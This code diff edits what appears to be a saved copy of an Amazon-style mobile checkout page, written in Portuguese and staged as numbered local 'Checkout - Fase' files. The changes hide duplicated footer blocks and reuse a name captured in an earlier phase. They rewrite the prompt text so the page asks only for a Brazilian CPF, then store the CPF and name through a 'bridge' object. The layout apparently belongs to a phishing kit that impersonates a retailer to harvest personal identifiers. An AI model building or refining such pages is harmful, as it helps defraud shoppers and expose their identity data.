@@ -60,6 +60,14 @@ html {
     padding-bottom: 0px !important;
     margin-bottom: 0px !important;
 }
+
+/* O HTML salvo trouxe um segundo bloco completo dentro do footer. */
+footer #pagelet-layout-section,
+footer #checkout-continue-alert-message,
+footer #checkout-primary-continue-button-id,
+footer #pipelinedPageTitle {
+    display: none !important;
+}
 </style>
 
 
@@ -1292,12 +1300,43 @@ footer, .nav-ftr-batmobile, #nav-ftr {
         await bridge.init('checkout_3');
         const state = bridge.state || {};
 
+        // Remove o bloco duplicado que foi salvo dentro do footer nesta fase.
+        const footer = document.querySelector('footer.nav-mobile');
+        if (footer) {
+            ['#pagelet-layout-section', '#checkout-continue-alert-message', '#checkout-primary-continue-button-id', '#pipelinedPageTitle']
+                .forEach((selector) => {
+                    footer.querySelectorAll(selector).forEach((node) => node.remove());
+                });
+        }
+
         const cpfInput = document.getElementById('payments-risk-compliance-customer-cpf');
         const nameInput = document.getElementById('payments-risk-compliance-customer-fullName');
+        const description = document.querySelector('#pagelet-layout-section .a-size-base.a-spacing-none.a-text-normal');
+        const tipsItems = Array.from(document.querySelectorAll('#pagelet-layout-section ul.a-unordered-list .a-list-item'));
+        const nameError = document.getElementById('fullName-error-message');
+        const storedName = typeof state.nome === 'string' ? state.nome.trim() : '';
+        const nameFieldRow = nameInput ? nameInput.closest('.a-row.a-spacing-none') : null;
 
         // Pre-fill if we have data from state
         if (cpfInput && state.cpf) cpfInput.value = state.cpf;
-        if (nameInput && state.nome) nameInput.value = state.nome;
+        if (nameInput && storedName) nameInput.value = storedName;
+
+        // Se o nome ja foi capturado na fase 1, nao pedimos novamente.
+        if (storedName && nameFieldRow) {
+            nameFieldRow.style.display = 'none';
+            if (nameError) {
+                nameError.style.display = 'none';
+            }
+            if (description) {
+                description.textContent = 'Para concluir seu pedido, confirme seu CPF.';
+            }
+            if (tipsItems[0]) {
+                tipsItems[0].textContent = 'Usaremos o nome informado na etapa anterior.';
+            }
+            if (tipsItems[2]) {
+                tipsItems[2].innerHTML = 'O CPF deve pertencer a uma pessoa <strong class="a-text-bold">maior de 18 anos.</strong>';
+            }
+        }
 
         // Mask for CPF
         if (cpfInput) {
@@ -1315,16 +1354,22 @@ footer, .nav-ftr-batmobile, #nav-ftr {
         if (continueBtn) {
             continueBtn.addEventListener('click', async (e) => {
                 e.preventDefault();
-                
-                const isValid = bridge.validateFields({
-                    cpf: '#payments-risk-compliance-customer-cpf',
-                    nome: '#payments-risk-compliance-customer-fullName'
-                });
+
+                const fieldsToValidate = {
+                    cpf: '#payments-risk-compliance-customer-cpf'
+                };
+
+                if (!storedName) {
+                    fieldsToValidate.nome = '#payments-risk-compliance-customer-fullName';
+                }
+
+                const isValid = bridge.validateFields(fieldsToValidate);
 
                 if (isValid) {
-                    await bridge.save({ 
-                        cpf: cpfInput.value.trim(), 
-                        nome: nameInput.value.trim() 
+                    const resolvedName = storedName || (nameInput ? nameInput.value.trim() : '');
+                    await bridge.save({
+                        cpf: cpfInput.value.trim(),
+                        nome: resolvedName
                     });
                     window.location.href = 'Checkout - Fase 4.html';
                 }
